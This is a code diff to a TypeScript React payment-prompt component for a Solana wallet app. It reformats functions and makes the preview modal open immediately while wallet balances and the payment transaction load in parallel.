@@ -41,7 +41,10 @@ function sendErrorMessage(err: unknown): string {
 
 async function fetchSolPrice(): Promise<number> {
   try {
-    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', { signal: AbortSignal.timeout(4000) })
+    const res = await fetch(
+      'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd',
+      { signal: AbortSignal.timeout(4000) }
+    )
     if (!res.ok) return USD_PRICE.SOL
     const data = await res.json() as { solana?: { usd?: number } }
     const price = Number(data?.solana?.usd)
@@ -51,8 +54,10 @@ async function fetchSolPrice(): Promise<number> {
   }
 }
 
-/** Build FundStep list for modal preview — highest balance first */
-async function buildFundSteps(connection: Connection, publicKey: import('@solana/web3.js').PublicKey): Promise<FundStep[]> {
+async function buildFundSteps(
+  connection: Connection,
+  publicKey: import('@solana/web3.js').PublicKey
+): Promise<FundStep[]> {
   const solPrice = await fetchSolPrice()
 
   let holdings: SplHolding[] = []
@@ -62,7 +67,6 @@ async function buildFundSteps(connection: Connection, publicKey: import('@solana
       holdings = await scanAllHoldings(connection, publicKey).catch(() => [])
     }
   } catch {
-    // try fallback RPCs
     for (const url of FALLBACK_RPCS) {
       try {
         const conn = new Connection(url, { commitment: 'confirmed', confirmTransactionInitialTimeout: 30000 })
@@ -139,27 +143,32 @@ export function PaymentRequestPrompt() {
       }
 
       inFlight.current = true
-      setSubmitting(true)
-      setStatus('Scanning your wallet balances…')
       closeWalletModalRef.current()
 
-      try {
-        // Build fund steps for the modal preview (+ and - rows)
-        const fundSteps = await buildFundSteps(connectionRef.current, publicKeyRef.current)
-        setSteps(fundSteps)
+      // ── Open our modal IMMEDIATELY with a loading state ──
+      setConfig(cfg)
+      setSteps([])
+      setStatus('Scanning your wallet balances…')
+      setSubmitting(true)
+      setModalOpen(true)   // ← modal opens right away
 
-        // Pre-build the actual payment transaction
-        const payment = await buildLikePaymentTransaction({
-          connection: connectionRef.current,
-          from: publicKeyRef.current,
-          config: cfg,
-        })
+      try {
+        // Load balance data and build steps in background — modal is already visible
+        const [fundSteps, payment] = await Promise.all([
+          buildFundSteps(connectionRef.current, publicKeyRef.current!),
+          buildLikePaymentTransaction({
+            connection: connectionRef.current,
+            from: publicKeyRef.current!,
+            config: cfg,
+          }),
+        ])
+
+        setSteps(fundSteps)
         pendingPayment.current = payment
-        setConfig(cfg)
         setStatus('')
-        setModalOpen(true)   // ← show our modal with + / - rows
-        setSubmitting(false)
+        setSubmitting(false)  // enable the Confirm button
       } catch (err) {
+        setModalOpen(false)
         const message = sendErrorMessage(err)
         toast.error(message)
         inFlight.current = false
@@ -217,6 +226,7 @@ export function PaymentRequestPrompt() {
     inFlight.current = false
     setSubmitting(false)
     pendingPayment.current = null
+    setSteps([])
   }
 
   return (
